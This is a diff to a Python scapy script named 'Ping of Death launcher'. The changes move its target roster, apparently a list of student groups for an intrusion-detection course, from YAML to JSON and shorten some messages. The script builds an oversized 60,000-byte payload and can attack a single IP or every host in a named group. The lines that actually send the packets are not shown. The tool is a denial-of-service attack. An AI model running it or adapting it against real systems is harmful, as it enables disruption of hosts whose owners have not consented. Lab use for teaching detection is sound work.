@@ -1,13 +1,13 @@
-import yaml
+import json
 import argparse
 from scapy.all import *
 import time
 
-PAYLOAD = "X" * 60000   # oversized payload for PoD
+PAYLOAD = "X" * 60000   # oversized payload
 
-def load_roster(path="ids_sec3_students.yaml"):
+def load_roster(path="ids_sec3_students.json"):
     with open(path) as f:
-        return yaml.safe_load(f)
+        return json.load(f)
 
 def send_pod(ip):
     print("Attacking {}".format(ip))
@@ -18,7 +18,7 @@ def send_pod(ip):
 
 def attack_group(group_name, roster):
     if group_name not in roster:
-        print("Group '{}' not found.".format(group_name))
+        print("Group '{}' not found".format(group_name))
         return
 
     group = roster[group_name]
@@ -28,8 +28,8 @@ def attack_group(group_name, roster):
 
 def main():
     parser = argparse.ArgumentParser(description="Ping of Death launcher")
-    parser.add_argument("--target-group", help="Group name from YAML (e.g., group1)")
-    parser.add_argument("--target-ip", help="Single IP address (e.g., 192.168.2.26)")
+    parser.add_argument("--target-group", help="Group name (e.g., group1)")
+    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
     args = parser.parse_args()
 
     roster = load_roster()
